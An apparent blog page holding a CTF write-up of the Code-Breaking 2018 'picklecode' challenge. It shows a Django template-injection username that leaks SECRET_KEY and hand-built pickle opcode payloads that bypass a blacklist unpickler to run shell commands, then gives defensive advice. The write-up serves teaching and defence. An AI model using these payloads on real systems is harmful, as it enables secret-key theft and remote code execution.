

<html class="no-js">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="keywords" content="" />
    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
    <title>Code-Breaking中的两个Python沙箱 | 离别歌</title>
    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
    
<style>div.row .col-xs-4 {
  float: left;
  margin-left: 4px;
}
div.row .col-xs-4 img {
  margin-left: 5px;
}
</style>
<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
<link rel="stylesheet" href="../static/deep/css/code.css">

</head>
<body>
<!--[if lt IE 8]>
    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
<![endif]-->
<div id="header">
    <div class="container">
        <h1 class="h1-title">
            <a href="../index.html">
               <img src="../static/deep/images/logo.png" alt="离别歌" />
            </a>
        </h1>
        <div id="nav">
        <input type="checkbox" id="button">
        <label for="button" onclick>菜单</label>
        
        <ul>
            
            <li class="item ">
                <a href="../index.html" >首页</a>
            </li>
            
            <li class="item ">
                <a href="../list/index.html" >文章</a>
            </li>
            
            <li class="item ">
                <a href="../other/tinger.html" >关于</a>
            </li>
            
            <li class="item ">
                <a href="../other/friends-link.html" >友链</a>
            </li>
            
            <li class="item ">
                <a href="https://github.com/phith0n" target="_blank" >项目</a>
            </li>
            
            <li class="item ">
                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
            </li>
            
        </ul>
        
        </div>
    </div>
</div>

<div class="banner-bar">
    <div class="container">
        <div class="col-12 columns">
            <div class="place">
                <a href="../index.html">首页</a>
                &raquo;
                
                网络安全 &raquo; <a href="code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱</a>
                
            </div>
        </div>
    </div>
</div>
<div class="container">
    <div class="col-11 columns" id="mainbody" role="main">
        <div class="post-single type-post">
            <h1 class="article-h1">Code-Breaking中的两个Python沙箱</h1>
            <div class="details-up">
  <span class="author">作者: phithon</span>
  
  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
  
  <span class="date">时间: 2019-5-27 10:57</span>
  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">6条评论</a></span>
  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="code-breaking-2018-python-sandbox.html">45907人看过</a></span>
  
  <span class="date">标签:
    
        <a href="../tag/code-breaking.html">code-breaking</a>
    
        <a href="../tag/python%E5%AE%89%E5%85%A8.html">python安全</a>
    
        <a href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">反序列化漏洞</a>
    
        <a href="../tag/ctf.html">ctf</a>
    
  </span>
  
</div>
            <div class="entry">
                <p>这是发表在跳跳糖上的文章<a href="https://www.tttang.com/archive/1294/">https://www.tttang.com/archive/1294/</a>，如需转载，请联系跳跳糖。</p>
<p>这是一篇Code-Breaking 2018鸽了半年的Writeup，讲一讲Django模板引擎沙箱和反序列化时的沙箱，和如何手搓Python picklecode绕过反序列化沙箱。</p>
<p>源码与环境在这里：<a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode">https://github.com/phith0n/code-breaking/blob/master/2018/picklecode</a></p>
<h2 id="django"><a class="toclink" href="#django">Django项目分析</a></h2>
<p>首先下载源码，可以发现目标是一个Django项目。</p>
<p>通常审计Django项目，我会先查看Django的配置文件。目标配置文件<code>code/settings.py</code>中有如下几个值得注意的地方：</p>
<ul>
<li><code>SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'</code></li>
<li><code>SESSION_SERIALIZER = 'core.serializer.PickleSerializer'</code></li>
</ul>
<p>因为和默认的Django配置文件相比，这两处可以说是很少在实际项目中看到的。</p>
<p><code>SESSION_ENGINE</code>指的是Django使用将用户认证信息存储在哪里，<code>SESSION_SERIALIZER</code>指的是Django用什么方式存储用户认证信息。</p>
<p>一个是存储位置，一个是存储方式。可以简单理解一下，用户的session对象先由<code>SESSION_SERIALIZER</code>指定的方式转换成一个字符串，再由<code>SESSION_ENGINE</code>指定的方式存储到某个地方。</p>
<p>默认Django项目中，这两个值分别是：<code>django.contrib.sessions.backends.db</code>和<code>django.contrib.sessions.serializers.JSONSerializer</code>。看名字就知道，默认Django的session是使用json的形式，存储在数据库里。</p>
<p>那么，这里用的两个不是很常见的配置，其实意思就是：该目标的session是用pickle的形式，存储在Cookie中。</p>
<p>目标显而易见了，pickle反序列化是可以执行任意命令的，我们要想办法控制这个值，进而获取目标系统权限。</p>
<p>再进一步思考，我们的目的就是控制session，而session engine是<code>django.contrib.sessions.backends.signed_cookies</code>，也就是说这个session是签名（signed）后存储在Cookie中的，我们唯一不知道的就是签名时使用的密钥。</p>
<h2 id="django_1"><a class="toclink" href="#django_1">Django模板引擎沙箱</a></h2>
<p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode/web/challenge/views.py#L11">阅读源码</a>我们发现，用户的用户名被拼接进模板中：</p>
<div class="codehilite"><pre><span></span><span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
    <span class="n">django_engine</span> <span class="o">=</span> <span class="n">engines</span><span class="p">[</span><span class="s1">&#39;django&#39;</span><span class="p">]</span>
    <span class="n">template</span> <span class="o">=</span> <span class="n">django_engine</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="s1">&#39;My name is &#39;</span> <span class="o">+</span> <span class="n">request</span><span class="o">.</span><span class="n">user</span><span class="o">.</span><span class="n">username</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">request</span><span class="p">))</span>
</pre></div>


<p>而用户名是注册时用户传入的，那么这里就存在一处模板注入漏洞。</p>
<p>Django的模板引擎沙箱其实一直是很安全的，也就是说即使你让用户控制了模板或模板的一部分，造成模板注入漏洞，也无法通过这个漏洞来执行代码。</p>
<p>但今天我们的目标只是获取Django项目的密钥，这一点还是可以做到的。</p>
<p>我们随便打开一个模板，然后在其中带有模板标签的地方下个断点，如<code>registration/login.html</code>中的<code>{% csrf_token %}</code>：</p>
<p><a href="../media/attachment/2019/05/27/082becba-5665-4f2b-9ad0-a3901543f8e8.png"><img alt="image.png" src="../media/attachment/2019/05/27/082becba-5665-4f2b-9ad0-a3901543f8e8.6b3fcb5c8184.png" /></a></p>
<p>可见，上下文中有很多变量。这些变量从哪里来的呢？有一部分是加载模板的时候传入的，还有一部分是Django自带的，你想知道Django自带哪些变量，可以看看配置中的templates项：</p>
<div class="codehilite"><pre><span></span><span class="n">TEMPLATES</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span>
        <span class="s1">&#39;BACKEND&#39;</span><span class="p">:</span> <span class="s1">&#39;django.template.backends.django.DjangoTemplates&#39;</span><span class="p">,</span>
        <span class="s1">&#39;DIRS&#39;</span><span class="p">:</span> <span class="p">[],</span>
        <span class="s1">&#39;APP_DIRS&#39;</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
        <span class="s1">&#39;OPTIONS&#39;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s1">&#39;context_processors&#39;</span><span class="p">:</span> <span class="p">[</span>
                <span class="s1">&#39;django.template.context_processors.debug&#39;</span><span class="p">,</span>
                <span class="s1">&#39;django.template.context_processors.request&#39;</span><span class="p">,</span>
                <span class="s1">&#39;django.contrib.auth.context_processors.auth&#39;</span><span class="p">,</span>
                <span class="s1">&#39;django.contrib.messages.context_processors.messages&#39;</span><span class="p">,</span>
            <span class="p">],</span>
        <span class="p">},</span>
    <span class="p">},</span>
<span class="p">]</span>
</pre></div>


<p>这里的<code>context_processors</code>就代表会向模板中注入的一些上下文。通常来说，<code>request</code>、<code>user</code>、和<code>perms</code>都是默认存在的，但显然，<code>settings</code>是不存在的，我们无法直接在模板中读取settings中的信息，包括密钥。</p>
<p>我在<a href="python-string-format-vulnerability.html">Python 格式化字符串漏洞（Django为例）</a>这篇文章里曾说过，可以通过request变量的属性，一步步地读取到SECRET_KEY。</p>
<p>但是和格式化字符串漏洞不同，Django的模板引擎有一定限制，比如我们无法读取用下划线开头的属性，所以，前文里说到的<code>{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code>这个方法是不能使用的。</p>
<p><a href="../media/attachment/2019/05/27/f89da16f-1d48-4f5f-88e1-caccce9952da.png"><img alt="image.png" src="../media/attachment/2019/05/27/f89da16f-1d48-4f5f-88e1-caccce9952da.ac17099b9fbc.png" /></a></p>
<p>但利用我刚讲的调试的方法，很容易地可以找到一些更好用的利用链，如：</p>
<p><a href="../media/attachment/2019/05/27/95f47034-51f0-4272-a3a1-d05d14061a96.png"><img alt="image.png" src="../media/attachment/2019/05/27/95f47034-51f0-4272-a3a1-d05d14061a96.852800290acd.png" /></a></p>
<p>其位置在<code>request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY</code>。</p>
<p>所以，我们注册一个名为<code>{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}</code>的用户，即可获取签名的密钥：</p>
<p><a href="../media/attachment/2019/05/27/a573c4f5-b45d-4b8b-91d1-65f8baaad833.png"><img alt="image.png" src="../media/attachment/2019/05/27/a573c4f5-b45d-4b8b-91d1-65f8baaad833.3d7d7974c9ac.png" /></a></p>
<p>这就是第一个沙箱，虽然我们没有完全绕过，但实际上也从中获取到了一些敏感信息。</p>
<h2 id="python"><a class="toclink" href="#python">深入研究Python反序列化</a></h2>
<p>接下来就要看看<code>SESSION_SERIALIZER = 'core.serializer.PickleSerializer'</code>了，虽然从名字上我们看出这里使用了pickle作为session的序列化方式，但打开<code>core.serializer.PickleSerializer</code>类就发现，实际上其中暗藏玄机：</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">io</span>
<span class="kn">import</span> <span class="nn">builtins</span>

<span class="n">__all__</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;PickleSerializer&#39;</span><span class="p">,</span> <span class="p">)</span>


<span class="k">class</span> <span class="nc">RestrictedUnpickler</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">Unpickler</span><span class="p">):</span>
    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;execfile&#39;</span><span class="p">,</span> <span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;open&#39;</span><span class="p">,</span> <span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="s1">&#39;__import__&#39;</span><span class="p">,</span> <span class="s1">&#39;exit&#39;</span><span class="p">}</span>

    <span class="k">def</span> <span class="nf">find_class</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
        <span class="c1"># Only allow safe classes from builtins.</span>
        <span class="k">if</span> <span class="n">module</span> <span class="o">==</span> <span class="s2">&quot;builtins&quot;</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">blacklist</span><span class="p">:</span>
            <span class="k">return</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">builtins</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
        <span class="c1"># Forbid everything else.</span>
        <span class="k">raise</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">(</span><span class="s2">&quot;global &#39;</span><span class="si">%s</span><span class="s2">.</span><span class="si">%s</span><span class="s2">&#39; is forbidden&quot;</span> <span class="o">%</span>
                                     <span class="p">(</span><span class="n">module</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span>


<span class="k">class</span> <span class="nc">PickleSerializer</span><span class="p">():</span>
    <span class="k">def</span> <span class="nf">dumps</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">loads</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
                <span class="k">raise</span> <span class="ne">TypeError</span><span class="p">(</span><span class="s2">&quot;Can&#39;t load pickle from unicode string&quot;</span><span class="p">)</span>
            <span class="nb">file</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">RestrictedUnpickler</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span>
                              <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;ASCII&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;strict&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">{}</span>
</pre></div>


<p>对Python熟悉的同学应该很清楚，通常我们反序列化只需要执行<code>pickle.loads</code>即可，但这里使用了<code>RestrictedUnpickler</code>这个类作为序列化时使用的过程类。</p>
<p>其实这就是<a href="https://docs.python.org/3.7/library/pickle.html#pickle-restrict">官方文档</a>给出的一个优化Python反序列化的方式，我们可以给反序列化设置黑白名单，进而限制这个功能被滥用：</p>
<p><a href="../media/attachment/2019/05/27/e016b6fb-d6bd-402b-9f1c-59652fb1b9b4.png"><img alt="image.png" src="../media/attachment/2019/05/27/e016b6fb-d6bd-402b-9f1c-59652fb1b9b4.9ad9519d3512.png" /></a></p>
<p>可见，我们只需要实现<code>pickle.Unpickler</code>这个类的<code>find_class</code>方法，并在其中进行判断即可。</p>
<p>回到我们的目标代码，可见，我的<code>find_class</code>中限制了反序列化的对象必须是<code>builtins</code>模块中的对象，但不能是<code>{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}</code>。</p>
<p>那么，这意味着什么呢？</p>
<p>我们举个最简单的例子，通常来说生成序列化字符串，我们可以写这样一个类：</p>
<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">s</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&quot;&quot;&quot;touch /tmp/success&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">s</span><span class="p">,))</span>
</pre></div>


<p>这样生成出的序列化字符串是：</p>
<div class="codehilite"><pre><span></span>b&#39;cposix\nsystem\np0\n(Vtouch /tmp/success\np1\ntp2\nRp3\n.&#39;
</pre></div>


<p>我们尝试执行反序列化：</p>
<p><a href="../media/attachment/2019/05/27/07ff0330-c171-47f3-9954-33d5b282619d.png"><img alt="image.png" src="../media/attachment/2019/05/27/07ff0330-c171-47f3-9954-33d5b282619d.0be704a921be.png" /></a></p>
<p>可见，这里就已经报错了。我们执行的是<code>os.system</code>，实际上在*nix系统下就是<code>posix.system</code>，而<code>find_class</code>中限制module必须是<code>builtins</code>，自然就被拦截了。</p>
<p>这就是反序列化沙盒，也是官方推荐用户使用的一种方式。</p>
<h2 id="_1"><a class="toclink" href="#_1">反序列化沙盒绕过</a></h2>
<p>那么，这里究竟该如何绕过这个沙盒呢？</p>
<p>首先明确一点，我们只能使用<code>builtins.*</code>方法，所以<code>subprocess</code>、<code>os</code>这种模块我们不需要去关注。</p>
<p><code>builtins</code>模块在Python中实际上就是不需要import就能使用的模块，比如常见的<code>open</code>、<code>__import__</code>、<code>eval</code>、<code>input</code>这种内置函数，都属于<code>builtins</code>模块。</p>
<p>但这些函数已经被禁用了：</p>
<ul>
<li>eval</li>
<li>exec</li>
<li>execfile</li>
<li>compile</li>
<li>open</li>
<li>input</li>
<li><code>__import__</code></li>
<li>exit</li>
</ul>
<p>不过经验丰富的Python小能手很容易就能想到，<code>getattr</code>这个万金油函数没有在黑名单中。</p>
<p>有了这个函数，我们就可以从上下文已有的变量内部，去寻找一些危险属性。比如，虽然<code>find_class</code>中不允许直接使用危险函数，但这个文件开头就引入了三个看着都挺危险的模块：</p>
<p><a href="../media/attachment/2019/05/27/c2c2d8bb-1bb1-497b-9c73-66b194ba5fa0.png"><img alt="image.png" src="../media/attachment/2019/05/27/c2c2d8bb-1bb1-497b-9c73-66b194ba5fa0.6b8f563fac39.png" /></a></p>
<p>我们可以通过<code>builtins.getattr('builtins', 'eval')</code>来获取eval函数，然后再执行即可。此时，<code>find_class</code>获得的module是<code>builtins</code>，name是<code>getattr</code>，在允许的范围中，不会被沙盒拦截。</p>
<p>这就等于绕过了沙盒。</p>
<h2 id="pickle-code"><a class="toclink" href="#pickle-code">如何用pickle code来写代码</a></h2>
<p>如果真正做过这题的同学，就会提出一个疑问了：首先执行getattr获取eval函数，再执行eval函数，这实际上是两步，而我们常用<code>__reduce__</code>生成的序列化字符串，只能执行一个函数，这就产生矛盾了。</p>
<p>那么，我们如何抛弃<code>__reduce__</code>，手搓pickle代码呢？</p>
<p>先来了解一下pickle究竟是个什么东西吧。pickle实际上是一门栈语言，他有不同的几种编写方式，通常我们人工编写的话，是使用protocol=0的方式来写。而读取的时候python会自动识别传入的数据使用哪种方式，下文内容也只涉及protocol=0的方式。</p>
<p>和传统语言中有变量、函数等内容不同，pickle这种堆栈语言，并没有“变量名”这个概念，所以可能有点难以理解。pickle的内容存储在如下两个位置中：</p>
<ul>
<li>stack 栈</li>
<li>memo 一个列表，可以存储信息</li>
</ul>
<p>我们还是以最常用的那个payload来看起，首先将payload <code>b'cposix\nsystem\np0\n(Vtouch /tmp/success\np1\ntp2\nRp3\n.'</code>写进一个文件，然后使用如下命令对其进行分析：</p>
<div class="codehilite"><pre><span></span>python -m pickletools pickle
</pre></div>


<p>可见，其实输出的是一堆OPCODE：</p>
<p><a href="../media/attachment/2019/05/27/76b0423d-76de-4ccc-b0e2-225f7dccffdc.png"><img alt="image.png" src="../media/attachment/2019/05/27/76b0423d-76de-4ccc-b0e2-225f7dccffdc.c25a71ad38fe.png" /></a></p>
<p>protocol 0的OPCODE是一些可见字符，比如上图中的<code>c</code>、<code>p</code>、<code>(</code>等。</p>
<p>我们在Python源码中可以看到所有opcode：</p>
<p><a href="../media/attachment/2019/05/27/6e3ef780-5535-4a7d-98c4-88edb18faf9f.png"><img alt="image.png" src="../media/attachment/2019/05/27/6e3ef780-5535-4a7d-98c4-88edb18faf9f.864e0472fcb8.png" /></a></p>
<p>上面例子中涉及的OPCODE我做下解释：</p>
<ul>
<li><code>c</code>：引入模块和对象，模块名和对象名以换行符分割。（<code>find_class</code>校验就在这一步，也就是说，只要c这个OPCODE的参数没有被<code>find_class</code>限制，其他地方获取的对象就不会被沙盒影响了，这也是我为什么要用getattr来获取对象）</li>
<li><code>(</code>：压入一个标志到栈中，表示元组的开始位置</li>
<li><code>t</code>：从栈顶开始，找到最上面的一个<code>(</code>，并将<code>(</code>到<code>t</code>中间的内容全部弹出，组成一个元组，再把这个元组压入栈中</li>
<li><code>R</code>：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上</li>
<li><code>p</code>：将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引</li>
<li><code>V</code>、<code>S</code>：向栈顶压入一个（unicode）字符串</li>
<li><code>.</code>：表示整个程序结束</li>
</ul>
<p>知道了这些OPCODE，我们很容易就翻译出<code>__reduce__</code>生成的这段pickle代码是什么意思了：</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span> <span class="n">c</span>    <span class="n">GLOBAL</span>     <span class="s1">&#39;posix system&#39;</span> <span class="err">#</span> <span class="err">向栈顶压入`</span><span class="n">posix</span><span class="o">.</span><span class="na">system</span><span class="err">`这个可执行对象</span>
<span class="mi">14</span><span class="o">:</span> <span class="n">p</span>    <span class="n">PUT</span>        <span class="mi">0</span> <span class="err">#</span> <span class="err">将这个对象存储到</span><span class="n">memo的第0个位置</span>
<span class="mi">17</span><span class="o">:</span> <span class="o">(</span>    <span class="n">MARK</span> <span class="err">#</span> <span class="err">压入一个元组的开始标志</span>
<span class="mi">18</span><span class="o">:</span> <span class="n">V</span>        <span class="n">UNICODE</span>    <span class="s1">&#39;touch /tmp/success&#39;</span> <span class="err">#</span> <span class="err">压入一个字符串</span>
<span class="mi">38</span><span class="o">:</span> <span class="n">p</span>        <span class="n">PUT</span>        <span class="mi">1</span> <span class="err">#</span> <span class="err">将这个字符串存储到</span><span class="n">memo的第1个位置</span>
<span class="mi">41</span><span class="o">:</span> <span class="n">t</span>        <span class="n">TUPLE</span>      <span class="o">(</span><span class="n">MARK</span> <span class="n">at</span> <span class="mi">17</span><span class="o">)</span> <span class="err">#</span> <span class="err">将由刚压入栈中的元素弹出，再将由这个元素组成的元组压入栈中</span>
<span class="mi">42</span><span class="o">:</span> <span class="n">p</span>    <span class="n">PUT</span>        <span class="mi">2</span> <span class="err">#</span> <span class="err">将这个元组存储到</span><span class="n">memo的第2个位置</span>
<span class="mi">45</span><span class="o">:</span> <span class="n">R</span>    <span class="n">REDUCE</span> <span class="err">#</span> <span class="err">从栈上弹出两个元素，分别是可执行对象和元组，并执行，结果压入栈中</span>
<span class="mi">46</span><span class="o">:</span> <span class="n">p</span>    <span class="n">PUT</span>        <span class="mi">3</span> <span class="err">#</span> <span class="err">将栈顶的元素（也就是刚才执行的结果）存储到</span><span class="n">memo的第3个位置</span>
<span class="mi">49</span><span class="o">:</span> <span class="o">.</span>    <span class="n">STOP</span> <span class="err">#</span> <span class="err">结束整个程序</span>
</pre></div>


<p>显然，这里的memo是没有起到任何作用的。所以，我们可以将这段代码进一步简化，去除存储memo的过程：</p>
<div class="codehilite"><pre><span></span>cposix
system
(Vtouch /tmp/success
tR.
</pre></div>


<p>这一段代码仍然是可以执行命令的。当然，有了memo可以让编写程序变得更加方便，使用<code>g</code>即可将memo中的内容取回栈顶。</p>
<p>那么，我们来尝试编写绕过沙盒的pickle代码吧。</p>
<p>首先使用<code>c</code>，获取<code>getattr</code>这个可执行对象：</p>
<div class="codehilite"><pre><span></span>cbuiltins
getattr
</pre></div>


<p>然后我们需要获取当前上下文，Python中使用<code>globals()</code>获取上下文，所以我们要获取<code>builtins.globals</code>：</p>
<div class="codehilite"><pre><span></span>cbuiltins
globals
</pre></div>


<p>Python中globals是个字典，我们需要取字典中的某个值，所以还要获取<code>dict</code>这个对象：</p>
<div class="codehilite"><pre><span></span>cbuiltins
dict
</pre></div>


<p>上述这几个步骤都比较简单，我们现在加强一点难度。现在执行<code>globals()</code>函数，获取完整上下文：</p>
<div class="codehilite"><pre><span></span>cbuiltins
globals
(tR
</pre></div>


<p>其实也很简单，栈顶元素是builtins.globals，我们只需要再压入一个空元组<code>(t</code>，然后使用<code>R</code>执行即可。</p>
<p>然后我们用<code>dict.get</code>来从globals的结果中拿到上下文里的<code>builtins对象</code>，并将这个对象放置在memo[1]：</p>
<div class="codehilite"><pre><span></span>cbuiltins
getattr
(cbuiltins
dict
S&#39;get&#39;
tR(cbuiltins
globals
(tRS&#39;builtins&#39;
tRp1
</pre></div>


<p>到这里，我们已经获得了阶段性的胜利，<code>builtins</code>对象已经被拿到了：</p>
<p><a href="../media/attachment/2019/05/27/1bd57247-fa5b-4701-90c7-3f415fe9c992.png"><img alt="image.png" src="../media/attachment/2019/05/27/1bd57247-fa5b-4701-90c7-3f415fe9c992.3be49143ce95.png" /></a></p>
<p>接下来，我们只需要再从这个没有限制的<code>builtins</code>对象中拿到eval等真正危险的函数即可：</p>
<div class="codehilite"><pre><span></span>...
cbuiltins
getattr
(g1
S&#39;eval&#39;
tR
</pre></div>


<p>g1就是刚才获取到的<code>builtins</code>，我继续使用getattr，获取到了<code>builtins.eval</code>。</p>
<p>再执行这个eval：</p>
<div class="codehilite"><pre><span></span>cbuiltins
getattr
(cbuiltins
dict
S&#39;get&#39;
tR(cbuiltins
globals
(tRS&#39;builtins&#39;
tRp1
cbuiltins
getattr
(g1
S&#39;eval&#39;
tR(S&#39;__import__(&quot;os&quot;).system(&quot;id&quot;)&#39;
tR.
</pre></div>


<p><a href="../media/attachment/2019/05/27/34deac25-bafe-4e45-8fbe-8267d2a0c717.png"><img alt="image.png" src="../media/attachment/2019/05/27/34deac25-bafe-4e45-8fbe-8267d2a0c717.1b12a410fea0.png" /></a></p>
<p>成功绕过沙盒。</p>
<p>当然，编写pickle代码远不止这么简单，仍有几十个OPCODE我们没有用过，只不过我们现在需要的只是这部分罢了。</p>
<h2 id="_2"><a class="toclink" href="#_2">后记</a></h2>
<p>出这道题的原因，主要就是考一考大家对Python真正的认识。有些时候打CTF真的是为了学知识，出题也是如此，出题人需要用知识来难倒做题者，而不是用一些繁琐的操作或者没太大意义的脑洞来考做题者。</p>
<p>那么，作为一个开发，如何防御本文描述的这些安全隐患呢？</p>
<p>第一，尽量不要让用户接触到Django的模板，模板的内容通过渲染而不是拼接引入；第二，使用官方推荐的<code>find_class</code>方法的确可以避免反序列化攻击，但在编写这个函数的时候，最好使用白名单来限制反序列化引入的对象，才能做到不被绕过。</p>
<p>这道题目参考了如下paper：</p>
<ul>
<li><a href="https://checkoway.net/musings/pickle/">Arbitrary code execution with Python pickles</a></li>
<li><a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf">http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/25981037">Python Pickle的任意代码执行漏洞实践和Payload构造</a></li>
<li><a href="http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/">Python反序列化漏洞的花式利用</a></li>
</ul>
            </div>
            <div itemprop="keywords" class="tags-meta">
                标签:
                
                    <a href="../tag/code-breaking.html">code-breaking</a>
                
                    <a href="../tag/python%E5%AE%89%E5%85%A8.html">python安全</a>
                
                    <a href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">反序列化漏洞</a>
                
                    <a href="../tag/ctf.html">ctf</a>
                
            </div>
            <br>
<!--MOB SHARE BEGIN-->
<div class="-mob-share-ui-button -mob-share-open">分享</div>
<div class="-mob-share-ui" style="display: none">
    <ul class="-mob-share-list">
        <li class="-mob-share-weibo"><p>新浪微博</p></li>
        <li class="-mob-share-qzone"><p>QQ空间</p></li>
        <li class="-mob-share-qq"><p>QQ好友</p></li>
        <li class="-mob-share-weixin"><p>微信</p></li>
        <li class="-mob-share-douban"><p>豆瓣</p></li>
        <li class="-mob-share-facebook"><p>Facebook</p></li>
        <li class="-mob-share-twitter"><p>Twitter</p></li>
        <li class="-mob-share-pocket"><p>Pocket</p></li>
        <li class="-mob-share-google"><p>Google+</p></li>
        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
        <li class="-mob-share-mingdao"><p>明道</p></li>
        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
    </ul>
    <div class="-mob-share-close">取消</div>
</div>
<div class="-mob-share-ui-bg"></div>
<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
<!--MOB SHARE END-->

        <div class="qqlist">
          <h3>订阅本站<small>(RSS)</small></h3>
          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
          <input type="hidden" value="qf_booked_feedback" name="t" />
          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
          <button type="submit" >订阅&rarr;</button>
          </form>
        </div>


        </div>

        
        <div class="post-single type-post text-center">
            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
            <img src="../static/wx.jpg" width="280" alt="">
        </div>
        

        <!-- 评论位置 -->
        <div id="comments" class="comments">
          <h3>已有 6 条评论</h3>
            <ol class="comment-list">
            
            
              <li class="comment-body" id="comment-3393">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">wasjser</a></div>
                    <p>好文章</p>
                    <span class="comment-time">时间: 2019-08-22 16:02</span>
                    <span class="comment-reply"><a href="#comment-3393" onclick="reply_to('3393','wasjser')">回复</a></span>
